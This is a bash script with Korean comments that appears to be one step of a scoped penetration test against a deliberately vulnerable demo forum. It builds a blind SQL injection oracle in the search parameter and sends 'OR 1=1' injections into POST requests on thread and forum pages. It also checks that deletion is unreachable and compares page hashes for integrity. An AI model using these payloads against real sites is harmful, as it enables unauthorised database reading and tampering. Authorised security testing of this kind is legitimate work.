#!/usr/bin/env bash
# Round 7 Part B4 — POST 경로(삭제 분기가 존재하는 유일한 경로) 검증.
# 프로토콜: 대상은 우리가 만든 스레드 id=9 및 그 포럼 id=0 뿐. 실행 전에 임계값 미달을 실측으로 확인.
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; JAR="$OUT/b_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30 -b "$JAR")
OUR=$(cat "$OUT/b_our_thread_id.txt" 2>/dev/null || echo 9)
oracle() { "${CURL[@]}" -G --data-urlencode "tfSearch=zzq')>0 OR ($1))--" "$BASE/search.asp" | grep -o "class='posttext'" | wc -l; }
pc() { grep -o "class='posttext'" "$1" 2>/dev/null | wc -l; }

echo "### E0. 실행 직전 안전 재확인 (삭제 분기 도달 불가 증명)"
printf "  COUNT(posts WHERE threadid=$OUR OR 1=1) > 100 → %s  (0=FALSE)\n" "$(oracle "(SELECT COUNT(*) FROM posts WHERE threadid=$OUR OR 1=1)>100")"
printf "  COUNT(threads WHERE forumid=0 OR 1=1)   > 100 → %s  (0=FALSE)\n" "$(oracle "(SELECT COUNT(*) FROM threads WHERE forumid=0 OR 1=1)>100")"
echo "  → 두 값 모두 FALSE = DELETE 분기(total>100) 도달 불가. 그럼에도 대상은 우리 스레드/포럼으로 한정."
BEFORE_POSTS=$(oracle "(SELECT COUNT(*) FROM posts)>10")   # 상한 밴드 기록용
echo "  (참고) COUNT(posts)>10 = $BEFORE_POSTS"

echo
echo "### E1. POST /showthread.asp  — id=$OUR OR 1=1  (우리 스레드 대상)"
"${CURL[@]}" -o "$OUT/e_post_thread_inj.html" -w "  code=%{http_code} size=%{size_download}\n" \
  -X POST "$BASE/showthread.asp" -G --data-urlencode "id=$OUR OR 1=1" \
  --data-urlencode 'tfSubject=RT7-INJ-POST-THREAD' --data-urlencode 'tfText=inj post thread'
echo "### E2. POST /showforum.asp   — id=0 OR 1=1   (우리 스레드가 속한 포럼 대상)"
"${CURL[@]}" -o "$OUT/e_post_forum_inj.html" -w "  code=%{http_code} size=%{size_download}\n" \
  -X POST "$BASE/showforum.asp" -G --data-urlencode "id=0 OR 1=1" \
  --data-urlencode 'tfSubject=RT7-INJ-POST-FORUM' --data-urlencode 'tfText=inj post forum'
echo "### E3. 대조군 — 주입 없는 정상 POST (우리 스레드, 쓰기 3)"
"${CURL[@]}" -o "$OUT/e_post_thread_ok.html" -w "  code=%{http_code} size=%{size_download}\n" \
  -X POST "$BASE/showthread.asp?id=$OUR" \
  --data-urlencode 'tfSubject=RT7-OWN-POST-3' --data-urlencode 'tfText=third own post (control)'

echo
echo "### E4. 무결성 검증 (실행 후)"
printf "  COUNT(posts)>10 (실행 전 %s) → %s\n" "$BEFORE_POSTS" "$(oracle '(SELECT COUNT(*) FROM posts)>10')"
printf "  COUNT(posts WHERE threadid=$OUR)=5 → %s  / =99 → %s\n" \
  "$(oracle "(SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=5")" \
  "$(oracle "(SELECT COUNT(*) FROM posts WHERE threadid=$OUR)=99")"
"${CURL[@]}" -o "$OUT/e_after_thread0.html" "$BASE/showthread.asp?id=0"
"${CURL[@]}" -o "$OUT/e_after_forum1.html"  "$BASE/showforum.asp?id=1"
"${CURL[@]}" -o "$OUT/e_after_thread2.html" "$BASE/showthread.asp?id=2"
"${CURL[@]}" -o "$OUT/e_after_default.html" "$BASE/Default.asp"
"${CURL[@]}" -o "$OUT/e_after_ourthread.html" "$BASE/showthread.asp?id=$OUR"
echo "  --- before vs after 해시 (다른 콘텐츠 = 동일해야 함) ---"
for pair in "b_before_thread0.html e_after_thread0.html thread0" \
            "b_before_forum1.html e_after_forum1.html forum1" \
            "b_before_thread2.html e_after_thread2.html thread2" \
            "b_before_default.html e_after_default.html Default" \
            "b_before_forum0.html e_after_forum0.html forum0(우리스레드 추가됨)"; do
  set -- $pair
  a=$(md5sum "$OUT/$1" | cut -d' ' -f1); b=$(md5sum "$OUT/$2" | cut -d' ' -f1)
  [ "$a" = "$b" ] && r="변경없음" || r="★변경됨"
  printf "  %-26s %s\n" "$3" "$r"
done
echo "  우리 스레드 현재 게시글 수: $(pc "$OUT/e_after_ourthread.html")"
echo "  주입 POST 응답에 오류 흔적: $(grep -ciE 'error|500' "$OUT/e_post_thread_inj.html" "$OUT/e_post_forum_inj.html" | tr '\n' ' ')"
